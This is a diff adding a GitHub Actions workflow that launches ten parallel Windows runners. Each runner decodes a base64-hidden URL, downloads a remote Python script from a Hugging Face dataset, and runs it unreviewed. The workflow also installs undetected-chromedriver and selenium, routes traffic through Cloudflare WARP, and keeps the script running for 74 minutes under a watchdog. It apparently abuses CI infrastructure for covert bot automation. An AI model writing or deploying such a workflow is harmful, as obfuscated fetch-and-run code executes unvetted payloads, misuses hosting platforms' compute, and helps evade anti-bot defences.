@@ -1,1 +1,70 @@
+name: Distributed Executor Grid
 
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: runner-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  spawn-runners:
+    name: "Runner-${{ matrix.worker_instance }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        worker_instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
+
+    steps:
+      - name: Prerequisite Installation & Boot
+        shell: bash
+        run: |
+          echo "[BOOT] Activating instance ${{ matrix.worker_instance }}..."
+          
+          # استرجاع النص البرمجي من المستودع البعيد
+          DOWNLOAD_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$DOWNLOAD_URL" -o app_task.py
+          
+          echo "[SETUP] Installing core dependencies..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[SETUP] Preparation finalized."
+
+      - name: Core Execution & Supervisory Routine
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Initiating worker thread for ID ${{ matrix.worker_instance }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $LaunchParams = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ActiveProcess = Start-Process @LaunchParams
+          
+          Write-Output ">>> Watchdog engaged. Time allowance: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $ActiveProcess -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Task concluded normally within the designated window."
+          }
+          catch {
+              Write-Output ">>> Time limit reached! Terminating runaway process..."
+              Stop-Process -InputObject $ActiveProcess -Force
+              Write-Output ">>> Process force-stopped successfully."
+          }
+
+      - name: Post-Execution Notification
+        shell: bash
+        run: echo "[DONE] Instance ${{ matrix.worker_instance }} completed its operational cycle."
